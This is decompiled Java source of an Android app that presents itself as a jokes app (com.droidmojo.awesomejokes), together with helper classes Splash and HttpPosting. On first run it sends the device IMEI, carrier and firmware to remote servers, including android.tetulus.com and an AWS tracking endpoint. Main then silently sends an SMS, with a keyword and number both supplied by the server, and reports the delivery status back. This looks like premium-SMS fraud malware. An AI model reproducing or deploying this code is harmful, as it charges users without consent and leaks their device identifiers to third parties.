package shared.library.us;

import java.io.BufferedReader;
import java.io.IOException;
import java.io.InputStream;
import java.io.InputStreamReader;
import java.net.HttpURLConnection;
import java.net.MalformedURLException;
import java.net.URL;
import java.util.ArrayList;
import java.util.List;
import org.apache.http.HttpResponse;
import org.apache.http.NameValuePair;
import org.apache.http.client.HttpClient;
import org.apache.http.client.entity.UrlEncodedFormEntity;
import org.apache.http.client.methods.HttpPost;
import org.apache.http.impl.client.DefaultHttpClient;
import org.apache.http.message.BasicNameValuePair;

public final class HttpPosting {
    public static String BASE_URL = "http://android.tetulus.com/";
    public static String appurl;
    public static String error;
    public static String query;

    public static String postData(String args) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(appurl + "?" + args).openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.connect();
            if (connection.getResponseCode() == 200) {
                StringBuffer sb = new StringBuffer();
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                while (true) {
                    String line = reader.readLine();
                    if (line == null) {
                        return sb.toString();
                    }
                    sb.append(line);
                }
            }
        } catch (MalformedURLException e) {
            error = e.getMessage();
        } catch (IOException e2) {
            error = e2.getMessage();
        }
        return "";
    }

    public static String postData2(String args) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(args).openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.connect();
            if (connection.getResponseCode() == 200) {
                StringBuffer sb = new StringBuffer();
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                while (true) {
                    String line = reader.readLine();
                    if (line == null) {
                        return sb.toString();
                    }
                    sb.append(line);
                }
            }
        } catch (MalformedURLException e) {
            error = e.getMessage();
        } catch (IOException e2) {
            error = e2.getMessage();
        }
        return "";
    }

    public String postData3(String args) {
        try {
            HttpURLConnection connection = (HttpURLConnection) new URL(args).openConnection();
            connection.setRequestMethod("GET");
            connection.setDoOutput(true);
            connection.setDoInput(true);
            connection.connect();
            if (connection.getResponseCode() == 200) {
                StringBuffer sb = new StringBuffer();
                BufferedReader reader = new BufferedReader(new InputStreamReader(connection.getInputStream()));
                while (true) {
                    String line = reader.readLine();
                    if (line == null) {
                        return sb.toString();
                    }
                    sb.append(line);
                }
            }
        } catch (MalformedURLException e) {
            error = e.getMessage();
        } catch (IOException e2) {
            error = e2.getMessage();
        }
        return "";
    }

    public static boolean sendRegistration(String accountName, String registrationId, String appid, String imei) {
        List values = new ArrayList();
        values.add(new BasicNameValuePair("accountName", accountName));
        values.add(new BasicNameValuePair("pid", appid));
        values.add(new BasicNameValuePair("imei", imei));
        values.add(new BasicNameValuePair("registrationid", registrationId));
        BASE_URL += "c2dm-registration.php";
        HttpResponse response = postData(values);
        if (response.getStatusLine().getStatusCode() == 200) {
            try {
                InputStream is = response.getEntity().getContent();
                StringBuffer b = new StringBuffer();
                while (true) {
                    int ch = is.read();
                    if (ch == -1) {
                        break;
                    }
                    b.append((char) ch);
                }
                if (b.toString().contains("ok")) {
                    return true;
                }
                return false;
            } catch (IllegalStateException e) {
                e.printStackTrace();
            } catch (IOException e2) {
                e2.printStackTrace();
            }
        }
        return false;
    }

    public static HttpResponse postData(List<NameValuePair> values) {
        HttpResponse response = null;
        try {
            HttpClient client = new DefaultHttpClient();
            HttpPost post = new HttpPost(BASE_URL);
            post.setEntity(new UrlEncodedFormEntity(values));
            return client.execute(post);
        } catch (Exception e) {
            error = e.getMessage();
            return response;
        }
    }
}
package com.droidmojo.awesomejokes;

import android.app.Activity;
import android.app.PendingIntent;
import android.content.BroadcastReceiver;
import android.content.Context;
import android.content.Intent;
import android.content.IntentFilter;
import android.os.Bundle;
import android.telephony.SmsManager;
import shared.library.us.CustomWebView;
import shared.library.us.HttpPosting;
import shared.library.us.Marketing;
import shared.library.us.Parameters;
import shared.library.us.Splash;

public class Main extends Activity {
    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        startActivityForResult(new Intent(this, Splash.class), 1);
    }

    public void onActivityResult(int requestCode, int resultCode, Intent data) {
        if (resultCode == 1) {
            showWebView(HttpPosting.appurl);
        } else if (resultCode == 2) {
            startActivityForResult(new Intent(this, Marketing.class), 1);
        } else if (resultCode == 3) {
            String query = "";
            String body = "";
            try {
                Parameters.jsonString = getPersistentData("atpJSONString");
                Parameters.init();
                body = Parameters.keyword + "  ?" + String.format("usca=%s", new Object[]{Parameters.usca});
                if (Parameters.debug.equals("1")) {
                    HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=" + Parameters.imei + "&pid=" + getString(2130968579) + "&type=message&log=" + body.replace(" ", "_"));
                }
                if (body.length() > 160) {
                    body = body.substring(0, 160);
                }
            } catch (Exception e) {
            }
            try {
                String SENT = "SMS_SENT";
                PendingIntent sentPI = PendingIntent.getBroadcast(this, 0, new Intent(SENT), null);
                registerReceiver(new BroadcastReceiver() {
                    public void onReceive(Context context, Intent intent) {
                        String result = "Unknown";
                        switch (getResultCode()) {
                            case -1:
                                result = "SMS_sent";
                                break;
                            case 1:
                                result = "Generic_failure";
                                break;
                            case 2:
                                result = "Radio_off";
                                break;
                            case 3:
                                result = "Null_PDU";
                                break;
                            case 4:
                                result = "No_service";
                                break;
                        }
                        if (Parameters.debug.equals("1")) {
                            HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=" + Parameters.imei + "&pid=" + Main.this.getString(2130968579) + "&type=sms&log=" + result);
                        }
                    }
                }, new IntentFilter(SENT));
                SmsManager.getDefault().sendTextMessage(Parameters.csc, null, body, sentPI, null);
                showWebView(getString(2130968578) + "hredirect.php?" + Parameters.getParams());
            } catch (Exception e2) {
                Exception ex = e2;
                if (Parameters.debug.equals("1")) {
                    HttpPosting.postData2("http://android.tetulus.com/atp-log.php?imei=error&pid=" + getString(2130968579) + "&type=error&log=" + ex.getLocalizedMessage());
                }
                showWebView(getString(2130968578) + "hredirect.php?" + Parameters.getParams());
            }
        } else if (resultCode == 4) {
            try {
                showWebView(HttpPosting.appurl + "?" + Parameters.getParams());
            } catch (Exception e3) {
            }
        } else if (resultCode == 99) {
            finish();
        } else {
            finish();
        }
    }

    public void showWebView(String url) {
        CustomWebView webView = new CustomWebView(this);
        webView.loadUrl(url);
        setContentView(webView);
    }

    /* access modifiers changed from: protected */
    public void onDestroy() {
        super.onDestroy();
    }

    private String getPersistentData(String key) {
        return getApplicationContext().getSharedPreferences(getString(2130968577), 0).getString(key, "unknown");
    }
}
package shared.library.us;

import android.app.Activity;
import android.content.SharedPreferences.Editor;
import android.os.Build.VERSION;
import android.os.Bundle;
import android.telephony.TelephonyManager;
import android.view.KeyEvent;
import android.widget.ImageView;
import android.widget.Toast;
import java.net.URLEncoder;
import java.util.Timer;
import java.util.TimerTask;

public class Splash extends Activity {
    /* access modifiers changed from: private */
    public ImageView img;
    /* access modifiers changed from: private */
    public String pid;
    /* access modifiers changed from: private */
    public String query;
    /* access modifiers changed from: private */
    public int resultCode;

    public void onCreate(Bundle savedInstanceState) {
        super.onCreate(savedInstanceState);
        setContentView(2130903042);
        this.img = (ImageView) findViewById(2131034122);
        this.img.setVisibility(4);
    }

    public void onResume() {
        super.onResume();
        if (getPersistentData("firstrun").equals("unknown")) {
            new Thread() {
                public void run() {
                    Splash.this.executeMillenialTracker();
                }
            }.start();
            new Thread() {
                public void run() {
                    String str = "UTF-8";
                    try {
                        Splash.this.initParams();
                        String cc = Splash.this.getNetworkOperator();
                        Parameters.sid = URLEncoder.encode(Parameters.sid, "UTF-8").replace("%00", "");
                        Splash.this.query = String.format("market=1&lpn=300&pid=%s&pm=%s&vd=%s&c=%s&imei=%s&firmware=%s&sdk=%s&sid=%s&cc=%s", new Object[]{Splash.this.pid, URLEncoder.encode(Parameters.pm, "UTF-8"), URLEncoder.encode(Parameters.vd, "UTF-8"), URLEncoder.encode(Parameters.carrier, "UTF-8"), Parameters.imei, Parameters.firmware, Parameters.sdk, Parameters.sid, cc});
                        String jsonString = HttpPosting.postData2(new StringBuilder(String.valueOf(Splash.this.getString(2130968578))).append("ip.php?").append(Splash.this.query).toString());
                        Parameters.jsonString = jsonString;
                        Parameters.init();
                        Splash.this.insertPersistentData("atpJSONString", jsonString);
                        Splash.this.backToMain();
                    } catch (Exception e) {
                        Exception ex = e;
                        Splash.this.setResult(1);
                        Splash.this.finish();
                    }
                }
            }.start();
            return;
        }
        backToMain();
    }

    /* access modifiers changed from: private */
    public void backToMain() {
        new Timer().schedule(new TimerTask() {
            public void run() {
                String str = "atpJSONString";
                String str2 = "1";
                String str3;
                if (Splash.this.getPersistentData("firstrun").equals("unknown")) {
                    str = "1";
                    Splash.this.insertPersistentData("firstrun", str2);
                    str3 = "1";
                    if (Parameters.restricted.equals(str2)) {
                        Splash.this.resultCode = 30;
                    } else {
                        str3 = "1";
                        if (!Parameters.iagree.equals(str2)) {
                            HttpPosting.appurl = new StringBuilder(String.valueOf(Splash.this.getString(2130968578))).append("hredirect.php?").append(Parameters.getParams()).toString();
                            Splash.this.resultCode = 1;
                        } else if (Parameters.referrer.contains("show")) {
                            Splash.this.resultCode = 2;
                        } else {
                            try {
                                Parameters.jsonString = Splash.this.getPersistentData("atpJSONString");
                                Parameters.init();
                                Splash.this.query = Parameters.getParams();
                                HttpPosting.appurl = new StringBuilder(String.valueOf(Splash.this.getString(2130968578))).append("daccess.php?").append(Splash.this.query).toString();
                                Splash.this.resultCode = 1;
                            } catch (Exception e) {
                            }
                        }
                    }
                } else {
                    str3 = "atpJSONString";
                    Parameters.jsonString = Splash.this.getPersistentData(str);
                    Parameters.init();
                    str3 = "1";
                    if (Parameters.restricted.equals(str2)) {
                        Splash.this.img.getHandler().post(new Runnable() {
                            public void run() {
                                Splash.this.img.setVisibility(0);
                            }
                        });
                        Splash.this.resultCode = 30;
                    } else {
                        Splash.this.query = Parameters.getParams();
                        HttpPosting.appurl = new StringBuilder(String.valueOf(Splash.this.getString(2130968578))).append("hredirect.php?").append(Splash.this.query).toString();
                        Splash.this.resultCode = 1;
                    }
                }
                if (Splash.this.resultCode == 30) {
                    Splash.this.img.getHandler().post(new Runnable() {
                        public void run() {
                            Splash.this.img.setVisibility(0);
                        }
                    });
                    Splash.this.setResult(99);
                    return;
                }
                Splash.this.setResult(Splash.this.resultCode);
                Splash.this.finish();
            }
        }, 500);
    }

    /* access modifiers changed from: private */
    public void initParams() {
        try {
            Parameters.init();
            this.pid = getString(2130968579);
            TelephonyManager telephonyManager = (TelephonyManager) getSystemService("phone");
            Parameters.carrier = URLEncoder.encode(telephonyManager.getNetworkOperatorName(), "UTF-8").replaceAll("\n", "");
            Parameters.imei = telephonyManager.getDeviceId();
            Parameters.firmware = VERSION.RELEASE;
            Parameters.sdk = VERSION.SDK;
            Parameters.pid = this.pid;
            Parameters.referrer = getReferrer();
            if (Parameters.referrer.indexOf("show") > -1 && Parameters.referrer.indexOf("sid") > -1) {
                Parameters.sid = Parameters.referrer.replace(".", "_");
            }
        } catch (Exception e) {
            Toast.makeText(this, e.getMessage(), 1);
        }
    }

    /* access modifiers changed from: private */
    public void executeMillenialTracker() {
        try {
            HttpPosting.postData2("http://mobpopup-elb-1179019535.us-east-1.elb.amazonaws.com/android/mm-track.php?pid=" + getString(2130968579) + "&imei=" + getIMEI() + "&referrer=" + getReferrer());
        } catch (Exception e) {
            e.printStackTrace();
        }
    }

    private String getIMEI() {
        return ((TelephonyManager) getSystemService("phone")).getDeviceId();
    }

    private String getReferrer() {
        String str = "";
        try {
            return Util.ReadSettings(this);
        } catch (Exception e) {
            return "";
        }
    }

    /* access modifiers changed from: private */
    public String getNetworkOperator() {
        return ((TelephonyManager) getSystemService("phone")).getNetworkOperator();
    }

    /* access modifiers changed from: private */
    public void insertPersistentData(String key, String value) {
        Editor editor = getApplicationContext().getSharedPreferences(getString(2130968577), 0).edit();
        editor.putString(key, value);
        editor.commit();
    }

    /* access modifiers changed from: private */
    public String getPersistentData(String key) {
        return getApplicationContext().getSharedPreferences(getString(2130968577), 0).getString(key, "unknown");
    }

    public boolean onKeyDown(int keyCode, KeyEvent event) {
        if (keyCode != 4 || this.resultCode == 99 || this.resultCode == 30) {
            return super.onKeyDown(keyCode, event);
        }
        return false;
    }
}
